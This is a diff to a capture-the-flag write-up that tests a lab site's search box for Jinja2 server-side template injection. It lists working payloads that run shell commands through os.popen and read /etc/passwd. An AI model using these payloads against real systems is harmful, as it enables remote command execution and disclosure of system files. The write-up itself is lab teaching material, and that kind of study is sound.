@@ -39,31 +39,31 @@ While browsing, on the team page, we can see that one of the team members is a F
 After seeing this, I can check for a potential SSTI (Server Side Template Injection) vulnerability. I followed the process from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
 Now, in the search box we can do the following tests:
 
-1. `${7*7}` 
+1. ${7*7}
 
 ![Test1](casino-SSTI-test-1.png)
 
-2. `{{7*7}}` 
+2. {{7*7}} 
 
 ![Test2](casino-SSTI-test-2.png)
 
-3. `{{7*'7'}}` 
+3. {{7*'7'}} 
 
 ![Test3](casino-SSTI-test-3.png)
 
-4. `{{ self._TemplateReference\__context.cycler\.__init\__.\__globals\__.os.popen('id').read() }}` 
+4. {{ self._TemplateReference\__context.cycler\.__init\__.\__globals\__.os.popen('id').read() }} 
 
 ![Test4](casino-SSTI-id.png)
 
-5. `{{ get_flashed_messages.\__globals\__.\__builtins\__.open("/etc/passwd").read() }}` 
+5. {{ get_flashed_messages.\__globals\__.\__builtins\__.open("/etc/passwd").read() }} 
 
 ![Test5](casino-SSTI-passwd.png)
 
-6. `{{ self._TemplateReference\__context.namespace.\__init\__.\__globals\__.os.popen('ls /home').read() }}` 
+6. {{ self._TemplateReference\__context.namespace.\__init\__.\__globals\__.os.popen('ls /home').read() }} 
 
 ![Test6](casino-SSTI-ls.png)
 
-7. `{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('which python3').read() }}`
+7. {{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('which python3').read() }}
 
 ![Test7](casino-SSTI-python3.png)
     
